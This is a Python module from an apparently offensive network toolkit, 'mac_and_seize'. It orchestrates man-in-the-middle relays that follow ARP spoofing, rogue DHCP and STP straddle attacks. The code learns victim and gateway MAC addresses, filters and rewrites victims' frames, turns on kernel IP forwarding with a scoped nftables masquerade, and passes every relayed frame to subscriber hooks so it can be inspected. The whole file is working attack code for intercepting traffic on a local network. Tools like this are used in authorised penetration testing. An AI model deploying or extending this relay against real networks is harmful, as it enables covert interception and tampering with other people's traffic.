"""Relay orchestration (the module's session service).

Session-scoped registry of running relay flows plus the four ``begin_*``
helpers each redirection module (:mod:`~mac_and_seize.modules.lan.arp`,
:mod:`~mac_and_seize.modules.lan.dhcp`, :mod:`~mac_and_seize.modules.lan.stp`)
calls when its ``--relay`` / ``--nat-relay`` flag is set. Nothing in the
attack modules touches sniffers, sockets, sysctls, or nftables directly - the
whole surface of "make redirected traffic actually flow through us" lives
here.

Two engines are exposed:

* **scapy paired sniff+inject** (:meth:`begin_l2_onseg`,
  :meth:`begin_l3_gateway_scapy`, :meth:`begin_straddle`). Backed by
  :class:`~mac_and_seize.net.relay.RelaySession`; touches only a dedicated
  nftables INPUT-drop table so the kernel doesn't double-process what we
  are handling. Nothing else global is modified.
* **kernel forwarding + NAT** (:meth:`begin_l3_gateway_kernel`). Backed by
  :mod:`~mac_and_seize.net.adapters.forwarding`: snapshots
  ``net.ipv4.ip_forward`` and ``net.ipv4.conf.<iface>.send_redirects``,
  installs a dedicated nftables NAT table scoped to a named set of source
  addresses. Restored on :meth:`end`; on hard-kill the nftables side
  self-heals at next launch via :func:`purge_stale_tables`.

Handles returned by ``begin_*`` are opaque tokens the caller stores on its
own job so it can call :meth:`end` when the job stops (or
:meth:`end_all` collectively). See ``modules/README.md`` §8 and the
plan.
"""

from __future__ import annotations

import ipaddress
import threading
import time
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any, Callable

from mac_and_seize.core.errors import ModuleError
from mac_and_seize.net.adapters import forwarding, netifaces_io, scapy_io
from mac_and_seize.net.relay import (
    RelayFlow,
    RelaySession,
    rewrite_arp_mitm,
    rewrite_dst_mac,
)
from mac_and_seize.observability import get_logger

if TYPE_CHECKING:
    from mac_and_seize.core.context import AppContext
    from mac_and_seize.core.tasks import Task

#: How long to wait for an ARP reply when learning a peer MAC. Local link only;
#: the peer is on this segment so a single probe usually suffices.
_ARP_LEARN_TIMEOUT_S = 1.0

#: How many retries the ARP probe does before giving up on a peer MAC.
_ARP_LEARN_RETRIES = 2

#: Kinds recorded on each :class:`_RelayEntry` for the ``relay list`` view.
KIND_L2_ONSEG = "l2-arp"
KIND_L3_SCAPY = "l3-dhcp"
KIND_L3_KERNEL = "l3-dhcp-nat"
KIND_STRADDLE = "l2-straddle"

#: Human-readable engine label per kind.
_ENGINE_BY_KIND = {
    KIND_L2_ONSEG: "python",
    KIND_L3_SCAPY: "python",
    KIND_L3_KERNEL: "kernel",
    KIND_STRADDLE: "python",
}


@dataclass
class RelayHandle:
    """Opaque token returned by every ``begin_*`` and consumed by :meth:`end`.

    Callers store it on their own job (see ``lan/arp/service.py``,
    ``lan/dhcp/service.py``, ``lan/stp/service.py``) and never look inside;
    the ``id`` field is only for equality and logs.
    """

    id: int
    kind: str
    label: str


@dataclass
class _RelayEntry:
    """Internal registry entry for one running relay handle."""

    handle: RelayHandle
    ifaces: list[str]  # ifaces this entry owns INPUT-drop refcount on
    session: RelaySession | None = None
    #: For kernel handles: which sysctls we forced, so :meth:`end` can restore.
    sysctl_snapshot: forwarding.SysctlSnapshot | None = None
    #: For kernel handles: current set of source addrs in the masquerade set.
    nat_sources: set[str] = field(default_factory=set)
    task: "Task | None" = None


class RelayService:
    """Session-scoped registry of running relay flows.

    Instantiated once per :class:`~mac_and_seize.core.context.AppContext`.
    Handles are keyed by an auto-incrementing id; the registry is protected
    by ``self._lock``. Subscribers (see :meth:`subscribe_all`) are cached as
    an immutable tuple so the per-frame fan-out on the sniffer thread is a
    cheap tuple iteration with no locking.
    """

    def __init__(self) -> None:
        self._log = get_logger(__name__)
        self._lock = threading.RLock()
        self._entries: dict[int, _RelayEntry] = {}
        self._next_id = 1
        self._subscribers: dict[int, Callable[[Any], None]] = {}
        self._subscribers_snapshot: tuple[Callable[[Any], None], ...] = ()
        self._next_subscriber_id = 1
        #: iface -> refcount of scapy sessions asking for the INPUT-drop rule.
        self._input_drop_refs: dict[str, int] = {}
        #: ifaces on which a kernel-NAT relay is running. A scapy relay on
        #: the same iface would install an INPUT-drop rule that eats the very
        #: traffic the kernel path is forwarding; the check is bidirectional
        #: with :meth:`begin_l3_gateway_kernel`'s ``_input_drop_refs`` check.
        self._nat_ifaces: set[str] = set()
        self._context: "AppContext | None" = None

        # Self-heal nftables tables left over from a prior process (see the
        # "cleanup on hard kill" mitigation in the plan). Sysctls are not
        # self-healed - we cannot know what to restore them to.
        try:
            deleted = forwarding.purge_stale_tables()
            if deleted:
                self._log.warning(
                    "Purged stale relay nftables tables: %s",
                    ", ".join(deleted),
                )
        except Exception:  # noqa: BLE001 - service init must never crash
            self._log.debug("Stale-table purge failed", exc_info=True)

    # --- Public API: subscribers ----------------------------------------------

    def subscribe_all(self, handler: Callable[[Any], None]) -> int:
        """Register ``handler`` for the fan-out of every relayed frame.

        Returns a token that :meth:`unsubscribe` uses to remove the handler.
        The handler runs on the sniffer thread with the *original* (pre-rewrite)
        frame; it must be quick and must never write to stdout/stderr (see
        ``modules/README.md`` §9 on background-thread output).

        Subscribing while relays are running attaches to them retroactively -
        already-active sessions start firing the hook on the next frame.
        """
        with self._lock:
            token = self._next_subscriber_id
            self._next_subscriber_id += 1
            self._subscribers[token] = handler
            self._rebuild_subscriber_snapshot_locked()
            self._propagate_subscriber_hook_locked()
        self._log.info("Relay subscriber attached (token=%d)", token)
        return token

    def unsubscribe(self, token: int) -> None:
        """Remove a previously-registered subscriber (idempotent)."""
        with self._lock:
            self._subscribers.pop(token, None)
            self._rebuild_subscriber_snapshot_locked()
            self._propagate_subscriber_hook_locked()
        self._log.info("Relay subscriber detached (token=%d)", token)

    # --- Public API: begin_* --------------------------------------------------

    def begin_l2_onseg(
        self,
        context: "AppContext",
        *,
        iface: str,
        spoofed_ip: str,
        victim_ips: list[str],
    ) -> RelayHandle:
        """Start an on-segment L2 MiTM relay (the ARP MiTM case).

        Learns the real MAC of ``spoofed_ip`` and of each ``victim_ips``
        entry - discovery-first, :func:`scapy_io.arp_probe` fallback (see the
        neighbor-cache race mitigation in the plan). Then installs the
        nftables INPUT-drop rule and starts a :class:`RelaySession` that
        catches frames destined to us from any victim (or from the spoofed
        peer, if the operator has separately poisoned that direction too) and
        rewrites the dst-MAC to the correct real peer.

        Frames' *source* MAC is preserved so the segment's switch CAM stays
        correct - see the "preserving switch learning" invariant in the plan.
        """
        if not victim_ips:
            raise ValueError("Give at least one victim IP to relay.")
        spoofed_ip = self._validate_ip(spoofed_ip, "spoofed_ip")
        victim_ips = [self._validate_ip(v, "victim_ip") for v in victim_ips]
        our_mac, our_ip = self._iface_addresses(iface)

        spoofed_mac = self._learn_peer_mac(context, iface, spoofed_ip)
        victim_ip_to_mac: dict[str, str] = {}
        for victim_ip in victim_ips:
            mac = self._learn_peer_mac(
                context, iface, victim_ip, tolerate_missing=True
            )
            if mac is not None:
                victim_ip_to_mac[victim_ip] = mac
        if not victim_ip_to_mac:
            raise ModuleError(
                "Could not learn any victim's real MAC (discovery empty and "
                "ARP probe silent); refusing to start the relay because the "
                "forward direction would have no route."
            )

        # BPF: catch anything destined to us from a victim IP or from the
        # spoofed peer's IP - covers both directions if the operator has
        # separately poisoned the reverse. See :func:`rewrite_arp_mitm` for
        # how the two directions are disambiguated.
        victim_bpf = " or ".join(f"ip src {ip}" for ip in victim_ip_to_mac)
        bpf = (
            f"ether dst {our_mac} and not ether src {our_mac} and "
            f"(({victim_bpf}) or ip src {spoofed_ip})"
        )
        label = (
            f"{iface}:{spoofed_ip} -> {','.join(victim_ip_to_mac)}"
        )
        flow = RelayFlow(
            label=label,
            iface_in=iface,
            iface_out=iface,
            bpf=bpf,
            rewrite_fn=rewrite_arp_mitm(spoofed_mac, victim_ip_to_mac),
        )
        return self._start_scapy_session(
            context,
            kind=KIND_L2_ONSEG,
            label=label,
            our_mac=our_mac,
            ifaces_for_drop=[iface],
            flows=[flow],
        )

    def begin_l3_gateway_scapy(
        self,
        context: "AppContext",
        *,
        iface: str,
        upstream_gateway_ip: str,
    ) -> RelayHandle:
        """Start the one-way scapy relay for the rogue-DHCP gateway case.

        Learns the real upstream router's MAC and forwards **every** frame
        arriving at our MAC on ``iface`` whose IP destination is not us - the
        natural traffic pattern once we've handed out rogue leases pointing
        clients at us. Return traffic bypasses us (the real gateway still has
        the victim's real MAC in its cache); layer a companion
        ``lan arp spoof --relay`` of the victim toward the real gateway for a
        two-way MiTM in this engine.
        """
        upstream_gateway_ip = self._validate_ip(
            upstream_gateway_ip, "upstream_gateway_ip"
        )
        our_mac, our_ip = self._iface_addresses(iface)
        upstream_mac = self._learn_peer_mac(context, iface, upstream_gateway_ip)

        bpf = (
            f"ether dst {our_mac} and not ether src {our_mac} and "
            f"ip and not ip dst {our_ip}"
        )
        label = f"{iface}:* -> {upstream_gateway_ip}"
        flow = RelayFlow(
            label=label,
            iface_in=iface,
            iface_out=iface,
            bpf=bpf,
            rewrite_fn=rewrite_dst_mac(upstream_mac),
        )
        return self._start_scapy_session(
            context,
            kind=KIND_L3_SCAPY,
            label=label,
            our_mac=our_mac,
            ifaces_for_drop=[iface],
            flows=[flow],
        )

    def begin_l3_gateway_kernel(
        self,
        context: "AppContext",
        *,
        iface: str,
        initial_sources: list[str],
    ) -> RelayHandle:
        """Start the two-way kernel-NAT relay for the rogue-DHCP gateway case.

        Snapshots ``net.ipv4.ip_forward`` and
        ``net.ipv4.conf.<iface>.send_redirects``, sets both to their relay
        values, and installs a scoped MASQUERADE against a named set of
        source addresses. The DHCP service extends and prunes the set via
        :meth:`add_nat_source` / :meth:`remove_nat_source` as it hands out
        and reclaims leases.

        Not compatible with running alongside a scapy session on the same
        iface: the INPUT-drop rule would eat frames the kernel needs to see.
        Rejected at start time.
        """
        our_mac, _our_ip = self._iface_addresses(iface)
        with self._lock:
            scapy_conflict = iface in self._input_drop_refs
            nat_conflict = iface in self._nat_ifaces
            if scapy_conflict:
                raise ModuleError(
                    f"A scapy relay is already active on {iface!r}; "
                    "'--nat-relay' can't run alongside it (they touch "
                    "conflicting kernel paths). Stop the scapy relay first."
                )
            if nat_conflict:
                raise ModuleError(
                    f"A kernel-NAT relay is already active on {iface!r}; "
                    "stop it with 'relay stop' before starting another."
                )

        sanitized: list[str] = []
        for addr in initial_sources:
            try:
                sanitized.append(self._validate_ip(addr, "initial source"))
            except ValueError as exc:
                self._log.warning(
                    "Skipping unparseable initial NAT source %r: %s", addr, exc
                )

        snap = forwarding.SysctlSnapshot()
        try:
            forwarding.snapshot_and_set(snap, "net.ipv4.ip_forward", "1")
            forwarding.snapshot_and_set(
                snap,
                f"net.ipv4.conf.{iface}.send_redirects",
                "0",
            )
            forwarding.install_masquerade(iface, sanitized)
        except Exception:
            forwarding.remove_masquerade()
            forwarding.restore_sysctls(snap)
            raise

        with self._lock:
            handle = RelayHandle(
                id=self._next_id,
                kind=KIND_L3_KERNEL,
                label=f"{iface}:nat",
            )
            self._next_id += 1
            entry = _RelayEntry(
                handle=handle,
                ifaces=[iface],
                sysctl_snapshot=snap,
                nat_sources=set(sanitized),
            )
            entry.task = context.tasks.start(
                context.current_command,
                stop=lambda h=handle: self.end(h),
            )
            self._entries[handle.id] = entry
            self._nat_ifaces.add(iface)
            self._context = context
        self._log.info(
            "Started kernel NAT relay on %s (%d initial source(s))",
            iface, len(sanitized),
        )
        return handle

    def begin_straddle(
        self,
        context: "AppContext",
        *,
        iface_a: str,
        iface_b: str,
    ) -> RelayHandle:
        """Start the STP straddle relay: paired bridge between two NICs.

        No MAC rewrite; frames pass verbatim (Ether src *and* dst preserved),
        so both segments' switches keep learning their real correspondents.
        Python bridge - throughput ceiling is low tens of kpps; do not use
        for high-throughput segments.
        """
        if iface_a == iface_b:
            raise ValueError("STP straddle needs two different interfaces.")
        mac_a, _ = self._iface_addresses(iface_a)
        mac_b, _ = self._iface_addresses(iface_b)
        # Frames are bridged verbatim (both src and dst preserved), so we
        # can't tell our own reinjections from real segment traffic by
        # Ethernet source alone. The BPF below is a first-line filter that
        # drops anything sourced from our MACs; the real defence against a
        # self-echo loop is ``ignore_outgoing=True`` on the sniffer socket
        # (see ``net/adapters/scapy_io.py:dispatch_sniffer``), which uses
        # :class:`L2Socket` and skips ``PACKET_OUTGOING`` frames at the
        # ``recv_raw`` boundary.
        flow_ab = RelayFlow(
            label=f"{iface_a} -> {iface_b}",
            iface_in=iface_a,
            iface_out=iface_b,
            bpf=f"not ether src {mac_a} and not ether src {mac_b}",
            rewrite_fn=None,
        )
        flow_ba = RelayFlow(
            label=f"{iface_b} -> {iface_a}",
            iface_in=iface_b,
            iface_out=iface_a,
            bpf=f"not ether src {mac_a} and not ether src {mac_b}",
            rewrite_fn=None,
        )
        return self._start_scapy_session(
            context,
            kind=KIND_STRADDLE,
            label=f"{iface_a} <-> {iface_b}",
            our_mac=mac_a,
            ifaces_for_drop=[iface_a, iface_b],
            flows=[flow_ab, flow_ba],
        )

    # --- Public API: NAT set management --------------------------------------

    def add_nat_source(self, handle: RelayHandle, addr: str) -> None:
        """Add ``addr`` to the masquerade set of a kernel relay (no-op otherwise)."""
        with self._lock:
            entry = self._entries.get(handle.id)
            if entry is None or entry.handle.kind != KIND_L3_KERNEL:
                return
            if addr in entry.nat_sources:
                return
            entry.nat_sources.add(addr)
        forwarding.add_masquerade_source(addr)

    def remove_nat_source(self, handle: RelayHandle, addr: str) -> None:
        """Remove ``addr`` from the masquerade set of a kernel relay (no-op otherwise)."""
        with self._lock:
            entry = self._entries.get(handle.id)
            if entry is None or entry.handle.kind != KIND_L3_KERNEL:
                return
            if addr not in entry.nat_sources:
                return
            entry.nat_sources.discard(addr)
        forwarding.remove_masquerade_source(addr)

    # --- Public API: end -----------------------------------------------------

    def end(self, handle: RelayHandle) -> None:
        """Tear down one relay handle. Idempotent."""
        with self._lock:
            entry = self._entries.pop(handle.id, None)
            if entry is None:
                return
            context = self._context
        # Do the actual teardown outside the lock to avoid holding it across
        # a sniffer .stop() (which can take a moment).
        if entry.session is not None:
            entry.session.set_death_callback(None)
            entry.session.set_subscriber_hook(None)
            entry.session.end()
            # Give up our INPUT-drop references now that the session is gone.
            with self._lock:
                for iface in entry.ifaces:
                    self._decref_input_drop_locked(iface)
                self._rebuild_input_drop_locked()
        if entry.handle.kind == KIND_L3_KERNEL:
            forwarding.remove_masquerade()
            if entry.sysctl_snapshot is not None:
                forwarding.restore_sysctls(entry.sysctl_snapshot)
            with self._lock:
                for iface in entry.ifaces:
                    self._nat_ifaces.discard(iface)
        if entry.task is not None and context is not None:
            context.tasks.finish(entry.task)
        self._log.info(
            "Relay %s (%s) ended", entry.handle.kind, entry.handle.label
        )

    def end_all(self) -> str:
        """Tear down every running relay handle. Returns a one-line summary."""
        with self._lock:
            handles = [entry.handle for entry in self._entries.values()]
        if not handles:
            raise ModuleError("No relay flows are running.")
        for handle in handles:
            try:
                self.end(handle)
            except Exception:  # noqa: BLE001 - stop as many as we can
                self._log.exception(
                    "Relay %s (%s): teardown raised", handle.kind, handle.label
                )
        labels = ", ".join(f"{h.kind}@{h.label}" for h in handles)
        return f"Stopped {len(handles)} relay flow(s): {labels}."

    # --- Public API: views ---------------------------------------------------

    def list_rows(self) -> list[dict]:
        """Rows for the ``relay list`` view."""
        with self._lock:
            entries = list(self._entries.values())
        rows: list[dict] = []
        for entry in entries:
            forwarded = 0
            failures = 0
            running_for = 0.0
            if entry.session is not None:
                forwarded = entry.session.metrics.forwarded
                failures = entry.session.metrics.send_failures
                running_for = entry.session.runtime_seconds()
            rows.append(
                {
                    "id": entry.handle.id,
                    "kind": entry.handle.kind,
                    "engine": _ENGINE_BY_KIND.get(entry.handle.kind, "-"),
                    "label": entry.handle.label,
                    "forwarded": forwarded,
                    "send fails": failures,
                    "runtime (s)": f"{running_for:.0f}",
                    "nat sources": (
                        len(entry.nat_sources)
                        if entry.handle.kind == KIND_L3_KERNEL
                        else "-"
                    ),
                }
            )
        return rows

    # --- Internals: scapy-session start --------------------------------------

    def _start_scapy_session(
        self,
        context: "AppContext",
        *,
        kind: str,
        label: str,
        our_mac: str,
        ifaces_for_drop: list[str],
        flows: list[RelayFlow],
    ) -> RelayHandle:
        """Common start path for every scapy-backed relay session.

        Adds INPUT-drop references, installs/rebuilds the nftables table,
        registers the session, starts it, and hands out the handle.
        Rollback on failure: partial refcount increments are undone.
        """
        with self._lock:
            # Reject if any of the ifaces we'd take over already has a
            # kernel-NAT relay: the INPUT-drop rule would eat the traffic
            # the kernel is forwarding. Mirrors the reverse check in
            # :meth:`begin_l3_gateway_kernel`.
            conflicting = [i for i in ifaces_for_drop if i in self._nat_ifaces]
            if conflicting:
                raise ModuleError(
                    f"Kernel-NAT relay is already active on "
                    f"{', '.join(conflicting)!r}; a scapy relay's INPUT-drop "
                    "rule would eat the forwarded traffic. Stop the "
                    "kernel-NAT relay first with 'relay stop'."
                )
            for iface in ifaces_for_drop:
                self._input_drop_refs[iface] = (
                    self._input_drop_refs.get(iface, 0) + 1
                )
            try:
                self._rebuild_input_drop_locked()
            except Exception:
                for iface in ifaces_for_drop:
                    self._decref_input_drop_locked(iface)
                try:
                    self._rebuild_input_drop_locked()
                except Exception:  # noqa: BLE001
                    self._log.debug(
                        "Relay: rollback rebuild failed", exc_info=True
                    )
                raise

            handle = RelayHandle(id=self._next_id, kind=kind, label=label)
            self._next_id += 1
            session = RelaySession(
                kind=kind, label=label, our_mac=our_mac, flows=flows,
            )
            entry = _RelayEntry(
                handle=handle,
                ifaces=list(ifaces_for_drop),
                session=session,
            )
            self._entries[handle.id] = entry
            self._context = context

        # Wire callbacks *before* starting so a fast self-death has somewhere
        # to land. All-or-nothing start: on failure, roll back the registry
        # and the INPUT-drop refs.
        session.set_death_callback(self._on_session_death)
        if self._subscribers_snapshot:
            session.set_subscriber_hook(self._fanout)
        try:
            session.begin()
        except Exception:
            with self._lock:
                self._entries.pop(handle.id, None)
                for iface in ifaces_for_drop:
                    self._decref_input_drop_locked(iface)
                try:
                    self._rebuild_input_drop_locked()
                except Exception:  # noqa: BLE001
                    self._log.debug(
                        "Relay: rollback rebuild failed", exc_info=True
                    )
            raise

        with self._lock:
            entry.task = context.tasks.start(
                context.current_command,
                stop=lambda h=handle: self.end(h),
            )
        return handle

    # --- Internals: self-death handling --------------------------------------

    def _on_session_death(self, session: RelaySession, reason: str) -> None:
        """Called from a session's monitor thread when it decides it's dead."""
        handle: RelayHandle | None = None
        context: "AppContext | None" = None
        with self._lock:
            # Capture the handle inside the lock: an interleaving end_all()
            # could have popped the entry between the search and a later
            # unlocked lookup, raising KeyError on the monitor thread.
            for entry in self._entries.values():
                if entry.session is session:
                    handle = entry.handle
                    context = self._context
                    break
        if handle is None:
            return
        self._log.warning(
            "Relay %s (%s) self-terminating: %s",
            handle.kind, handle.label, reason,
        )
        self.end(handle)
        if context is not None:
            try:
                context.presenter.notify(
                    f"Relay {handle.kind} on {handle.label} stopped: {reason}."
                )
            except Exception:  # noqa: BLE001 - notify is fire-and-forget
                self._log.debug("Relay: notify failed", exc_info=True)

    # --- Internals: INPUT-drop refcount + rebuild ----------------------------

    def _decref_input_drop_locked(self, iface: str) -> None:
        count = self._input_drop_refs.get(iface, 0) - 1
        if count <= 0:
            self._input_drop_refs.pop(iface, None)
        else:
            self._input_drop_refs[iface] = count

    def _rebuild_input_drop_locked(self) -> None:
        """Rebuild the nftables INPUT-drop table from the current refcount map.

        Called with the service lock held. Deletes the table when no ifaces
        need it any more. Reads each iface's ``(mac, ip)`` fresh via
        :meth:`_iface_addresses`: cheap (a single ``netifaces`` call reading
        /proc) and avoids the stale-cache pitfall of holding onto the values
        an interface had at first-relay time when the operator has since
        changed them.
        """
        if not self._input_drop_refs:
            forwarding.install_input_drop([])
            return
        entries: list[tuple[str, str, str]] = []
        for iface in self._input_drop_refs:
            our_mac, our_ip = self._iface_addresses(iface)
            entries.append((iface, our_mac, our_ip))
        forwarding.install_input_drop(entries)

    # --- Internals: fan-out subscribers --------------------------------------

    def _rebuild_subscriber_snapshot_locked(self) -> None:
        self._subscribers_snapshot = tuple(self._subscribers.values())

    def _propagate_subscriber_hook_locked(self) -> None:
        hook = self._fanout if self._subscribers_snapshot else None
        for entry in self._entries.values():
            if entry.session is not None:
                entry.session.set_subscriber_hook(hook)

    def _fanout(self, pkt) -> None:
        """Deliver ``pkt`` to every subscribed handler. Runs on the sniffer thread."""
        for handler in self._subscribers_snapshot:
            try:
                handler(pkt)
            except Exception:  # noqa: BLE001 - one bad subscriber must not stop others
                self._log.debug("Relay: subscriber raised", exc_info=True)

    # --- Internals: iface identity ------------------------------------------

    def _iface_addresses(self, iface: str) -> tuple[str, str]:
        """Return the interface's ``(mac, primary_ipv4)``, read fresh from netifaces.

        Not cached: caching burned us on mid-session IP changes (the operator
        renumbering with ``interface ip4 set`` between two relay starts).
        A single ``netifaces.ifaddresses`` call reads ``/proc/net/dev``-adjacent
        state and is cheap enough to do on each rebuild.

        Raises :class:`ModuleError` if the iface has no IPv4 (a scapy relay
        without a local IP can still function - the L2 rewrite doesn't need
        our own IP - but the INPUT-drop rule keys on it, so refuse rather
        than silently omit the guard).
        """
        if iface not in netifaces_io.list_names():
            raise ModuleError(f"Unknown interface {iface!r}.")
        ipv4, _ipv6, mac = netifaces_io.read_addresses(iface)
        address = next((item for item in (ipv4.get("addr") or []) if item), None)
        hardware = next((item for item in (mac.get("addr") or []) if item), None)
        if not address:
            raise ModuleError(
                f"{iface} has no IPv4 address; the relay's kernel guard rule "
                "needs one. Give the interface an address first."
            )
        if not hardware:
            raise ModuleError(f"Could not read the MAC address of {iface!r}.")
        return (str(hardware).lower(), str(address))

    # --- Internals: neighbor learning ---------------------------------------

    def _learn_peer_mac(
        self,
        context: "AppContext",
        iface: str,
        peer_ip: str,
        *,
        tolerate_missing: bool = False,
    ) -> str | None:
        """Return the peer's real MAC, preferring discovery over an ARP probe.

        Order:
        1. ``context.service("discovery").list_rows()`` (matches the pattern in
           :func:`lan/arp/service.py:_resolve_targets`).
        2. :func:`scapy_io.arp_probe` on ``iface`` as a fallback.

        Raises :class:`ModuleError` if neither returned a MAC and
        ``tolerate_missing`` is ``False``.
        """
        mac = self._discovery_mac_for(context, peer_ip)
        if mac:
            self._log.info(
                "Relay: learned %s MAC %s from discovery", peer_ip, mac,
            )
            return mac.lower()
        try:
            found = scapy_io.arp_probe(
                [peer_ip],
                timeout=_ARP_LEARN_TIMEOUT_S,
                retries=_ARP_LEARN_RETRIES,
                iface=iface,
            )
        except OSError as exc:
            raise ModuleError(
                f"ARP probe for {peer_ip} on {iface} failed: {exc}"
            ) from exc
        mac = found.get(peer_ip)
        if mac:
            self._log.info(
                "Relay: learned %s MAC %s via ARP probe on %s",
                peer_ip, mac, iface,
            )
            return str(mac).lower()
        if tolerate_missing:
            self._log.warning(
                "Relay: could not learn MAC for %s on %s", peer_ip, iface,
            )
            return None
        raise ModuleError(
            f"Could not learn the real MAC of {peer_ip} on {iface!r} "
            "(discovery has no entry and no ARP reply). Run "
            "'discovery scan' targeting it first, or verify the host is up."
        )

    @staticmethod
    def _discovery_mac_for(
        context: "AppContext", peer_ip: str
    ) -> str | None:
        """Look up ``peer_ip`` in the discovery module's store, if loaded."""
        try:
            discovery = context.service("discovery")
        except KeyError:
            return None
        try:
            rows = discovery.list_rows()  # type: ignore[attr-defined]
        except Exception:  # noqa: BLE001 - discovery is optional
            return None
        for row in rows:
            ip = str(row.get("ip", "")).lstrip("*").strip()
            if ip == peer_ip:
                mac = str(row.get("mac", "") or "").strip()
                if mac and mac != "-":
                    return mac
        return None

    # --- Internals: validation ----------------------------------------------

    @staticmethod
    def _validate_ip(value: str, field: str) -> str:
        text = (value or "").strip()
        if not text:
            raise ValueError(f"{field} is required.")
        try:
            return str(ipaddress.IPv4Address(text))
        except ValueError as exc:
            raise ValueError(f"Invalid {field} {value!r}: {exc}.") from exc
